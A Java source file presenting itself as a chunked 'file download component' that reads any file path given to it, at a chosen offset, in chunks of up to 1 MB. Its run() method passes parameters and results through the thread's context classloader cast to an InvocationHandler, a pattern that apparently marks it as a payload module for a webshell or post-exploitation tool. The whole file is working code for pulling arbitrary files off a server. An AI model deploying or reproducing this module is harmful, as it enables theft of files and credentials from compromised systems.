package org.leo.core.component;

import java.io.File;
import java.io.RandomAccessFile;
import java.util.HashMap;

/**
 * 文件下载组件
 * 提供高性能文件分块下载功能，兼容Java 1.5+
 * 
 * @author LeoSpring
 * @version 2.2
 */
public class FileDownloadComponent implements Runnable {
    
    private static final int MAX_CHUNK_SIZE = 1048576;
    
    private HashMap<String, Object> params;
    private HashMap<String, Object> results;


    
    public void run() {
        java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
        try {
            params = (java.util.HashMap) h.invoke(null, null, null);
            results = new java.util.HashMap();
            invoke();
        } catch (Throwable t) {
            if (results == null) results = new java.util.HashMap();
            results.put("code", Integer.valueOf(500));
            results.put("msg", t.getMessage());
        }
        if (results != null) {
            try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
        }
    }

    
    /**
     * 主要执行方法
     */
    public void invoke() throws Exception {
        fileDownload();
    }

    /**
     * 高性能文件下载
     */
    private void fileDownload() throws Exception {
        String path = getStringParam("path");
        long size = getLongParam("size", 0L);
        long offset = getLongParam("offset", 0L);

        if (path == null) {
            throw new IllegalArgumentException("path 不能为空");
        }
        if (path.length() == 0) {
            throw new IllegalArgumentException("path 不能为空");
        }
        if (size <= 0L) {
            throw new IllegalArgumentException("size 必须大于 0");
        }
        if (offset < 0L) {
            throw new IllegalArgumentException("offset 不能为负数");
        }
        
        File downloadFile = new File(path);
        if (!downloadFile.exists()) {
            results.put("code", 404);
            results.put("msg", "文件不存在: " + path);
            return;
        }
        
        if (!downloadFile.canRead()) {
            results.put("code", 403);
            results.put("msg", "文件无读取权限: " + path);
            return;
        }
        if (!downloadFile.isFile()) {
            results.put("code", 400);
            results.put("msg", "path 不是普通文件: " + path);
            return;
        }
        RandomAccessFile inputFile = null;
        
        try {
            inputFile = new RandomAccessFile(downloadFile, "r");

            long fileLength = inputFile.length();
            if (fileLength == 0 && offset == 0) {
                results.put("code", 200);
                results.put("length", Long.valueOf(0L));
                results.put("data", new byte[0]);
                results.put("bytesRead", Integer.valueOf(0));
                results.put("offset", Long.valueOf(0L));
                results.put("nextOffset", Long.valueOf(0L));
                results.put("isComplete", Boolean.TRUE);
                return;
            }

            inputFile.seek(offset);
            
            long availableSize = fileLength - offset;
            if (availableSize <= 0) {
                results.put("code", 416);
                results.put("msg", "请求范围不满足: offset=" + offset + ", fileSize=" + fileLength);
                return;
            }
            
            int readSize = (int) Math.min(size, availableSize);
            readSize = Math.min(readSize, MAX_CHUNK_SIZE); // 限制最大块大小
            
            byte[] buffer = new byte[readSize];
            int totalRead = readChunk(inputFile, buffer);
            
            // 如果实际读取的数据少于请求的数据，调整数组大小
            if (totalRead < readSize) {
                byte[] actualData = new byte[totalRead];
                System.arraycopy(buffer, 0, actualData, 0, totalRead);
                buffer = actualData;
            }
            
            // 设置响应状态
            boolean isComplete = (offset + totalRead) >= fileLength;
            results.put("code", isComplete ? 200 : 100);
            results.put("length", fileLength);
            results.put("data", buffer);
            results.put("bytesRead", totalRead);
            results.put("offset", offset);
            results.put("nextOffset", offset + totalRead);
            results.put("isComplete", isComplete);
        } finally {
            // 优化：确保资源正确关闭
            closeQuietly(inputFile);
        }
    }
    
    private int readChunk(RandomAccessFile file, byte[] buffer) throws Exception {
        int totalRead = 0;
        while (totalRead < buffer.length) {
            int bytesRead = file.read(buffer, totalRead, buffer.length - totalRead);
            if (bytesRead <= 0) break;
            totalRead += bytesRead;
        }
        return totalRead;
    }

    private String getStringParam(String key) throws Exception {
        Object value = params.get(key);
        if (value == null) return null;
        if (value instanceof byte[]) return new String((byte[]) value, "UTF-8");
        return String.valueOf(value);
    }

    private long getLongParam(String key, long defaultValue) throws Exception {
        Object value = params.get(key);
        if (value == null) return defaultValue;
        if (value instanceof Number) return ((Number) value).longValue();

        String text;
        if (value instanceof byte[]) {
            text = new String((byte[]) value, "UTF-8");
        } else {
            text = String.valueOf(value);
        }
        try {
            return Long.parseLong(text.trim());
        } catch (NumberFormatException e) {
            throw new IllegalArgumentException(key + " 必须是整数: " + text);
        }
    }
    
    /**
     * 安全关闭资源
     */
    private void closeQuietly(java.io.Closeable resource) {
        if (resource != null) {
            try {
                resource.close();
            } catch (Exception e) {
                // 忽略关闭异常
            }
        }
    }
}
